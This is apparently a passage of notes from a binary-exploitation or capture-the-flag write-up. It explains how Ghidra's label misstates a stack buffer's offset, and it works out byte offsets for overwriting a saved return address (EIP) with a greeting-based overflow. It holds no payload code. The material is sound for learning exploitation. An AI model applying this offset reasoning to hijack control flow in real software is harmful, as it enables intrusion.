## Notes

### The Ghidra offset trap

Ghidra labeled the greeting buffer `local_4c` which suggested it starts at `ebp-0x4c`, and the first assignment `local_4c[0] = 'H'` reinforces that. But the ASM copies the greeting via `lea -0x48(%ebp), %eax; mov (%edx), %ecx; mov %ecx, (%eax); ...`, which writes starting at `ebp-0x48`. So the true base is `ebp-0x48` and all offset math should use that. Four bytes' difference is enough to land on the caller's saved EBP instead of the saved EIP, which was the early failure mode.

### Why the default language falls short

"Hello " ends at `ebp-0x42`, giving 70 bytes of runway before the saved EIP. With a 72-byte user payload, only the first 2 bytes of EIP get overwritten; the other 2 stay as whatever the compiler left there, which is usually the real return address back to main. No redirection.

